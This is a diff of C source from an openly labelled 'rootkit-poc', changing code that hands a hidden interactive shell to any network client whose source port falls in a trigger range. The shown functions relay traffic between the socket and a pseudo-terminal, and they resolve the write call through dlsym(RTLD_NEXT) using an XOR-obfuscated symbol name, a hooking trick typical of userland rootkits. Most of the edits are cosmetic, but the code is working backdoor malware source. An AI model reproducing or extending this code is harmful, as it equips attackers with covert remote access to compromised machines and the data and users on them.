@@ -88,21 +88,21 @@ void shell_listener(int sock, int pty) {
         FD_SET(sock, &fds);
         FD_SET(pty, &fds);
 
-        if ((res = select(maxfd+1, &fds, NULL, NULL, NULL)) == -1) {
+        if ((res=select(maxfd+1, &fds, NULL, NULL, NULL)) == -1) {
             DEBUG("[rootkit-poc]: Select failed\n");
-            break; // Exit loop on select failure
+            break; // exit loop on select failure
         }
 
         if (FD_ISSET(sock, &fds)) {
             memset(&buf, 0x00, MAX_LEN);
 
-            if ((res = s_read(sock, buf, MAX_LEN)) <= 0) {
+            if ((res=s_read(sock, buf, MAX_LEN)) <= 0) {
                 if (res == 0) {
                     DEBUG("[rootkit-poc]: Client disconnected\n");
                 } else {
                     DEBUG("[rootkit-poc]: Error reading from client\n");
                 }
-                break; // Exit loop on read failure
+                break; // exit loop on read failure
             } else {
                 write(pty, buf, res);
             }
@@ -111,13 +111,13 @@ void shell_listener(int sock, int pty) {
         if (FD_ISSET(pty, &fds)) {
             memset(&buf, 0x00, MAX_LEN);
 
-            if ((res = read(pty, buf, MAX_LEN-31)) <= 0) {
+            if ((res=read(pty, buf, MAX_LEN-31)) <= 0) {
                 if (res == 0) {
                     DEBUG("[rootkit-poc]: PTY closed\n");
                 } else {
                     DEBUG("[rootkit-poc]: Error reading from pty\n");
                 }
-                break; // Exit loop on read failure
+                break; // exit loop on read failure
             } else {
                 s_write(sock, buf, res);
             }
@@ -142,18 +142,18 @@ int start_shell(int sock, struct sockaddr *addr) {
     memset(buffer, 0x00, sizeof(buffer)); // reset buffer 
 
     if (addr == NULL) {
-        fprintf(stderr, "Error: addr is NULL\n");
+        DEBUG("[rootkit-poc]: Error: addr is NULL\n");
         return -1;
     }
 
     if (addr->sa_family != AF_INET) {
-        fprintf(stderr, "Error: addr is not AF_INET\n");
+        DEBUG("[rootkit-poc]: Error: addr is not AF_INET\n");
         return -1;
     }
 
     struct sockaddr_in *sa_i = (struct sockaddr_in *)addr; // converts the address to sockaddr_in
 
-    if (htons(sa_i->sin_port) >= LOW_PORT && htons(sa_i->sin_port) <= HIGH_PORT) {
+    if (htons(sa_i->sin_port) >= SRC_LOW_PORT && htons(sa_i->sin_port) <= SRC_HIGH_PORT) {
         char *sys_write = strdup(SYS_WRITE);
         xor(sys_write);
         s_write = dlsym(RTLD_NEXT, sys_write);
@@ -171,11 +171,9 @@ int start_shell(int sock, struct sockaddr *addr) {
     char pty_name[51];
 
     if (openpty(&pty, &tty, pty_name, NULL, NULL) == -1) {
-        DEBUG("[rootkit-poc]: Failed to grab pty\n");
+        DEBUG("[rootkit-poc]: Error: failed to grab pty\n");
         return -1;
     }
-
-    char *ptr = &pty_name[5]; // ignores the first 5 chars of the pseudo-tty name (/dev/)
 
     if ((pid = fork()) == -1) {
         close(sock);
